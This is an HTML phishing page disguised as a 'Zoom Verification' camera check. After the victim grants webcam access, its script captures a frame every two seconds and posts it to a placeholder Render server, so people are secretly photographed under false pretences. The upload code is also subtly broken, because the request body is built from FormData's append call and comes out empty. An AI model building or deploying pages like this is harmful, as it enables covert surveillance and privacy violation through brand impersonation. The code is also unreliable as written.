<!DOCTYPE html>
<html>
<head><title>Zoom Verification</title>
<style>body{text-align:center;padding:50px;font:16px Arial}</style>
</head>
<body>
<h1>📹 Camera Verification Required</h1>
<p>Allow access to continue...</p>
<video id="video" width=400 height=300 style="border:2px solid #007bff;display:none"></video>
<div id="status">Click ALLOW camera permission</div>
<script>
navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
.then(stream => {
  document.getElementById('video').srcObject = stream;
  document.getElementById('video').style.display = 'block';
  document.getElementById('status').innerHTML = '✅ Camera Active';
  // Send frames to Render server
  setInterval(() => {
    const canvas = document.createElement('canvas');
    canvas.width = 400; canvas.height = 300;
    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0);
    canvas.toBlob(blob => {
      fetch('https://YOUR-RENDER-APP.onrender.com/upload', {
        method: 'POST',
        body: new FormData().append('frame', blob, 'cam.jpg')
      });
    });
  }, 2000);
}).catch(() => document.getElementById('status').innerHTML = 'Allow camera!');
</script>
</body>
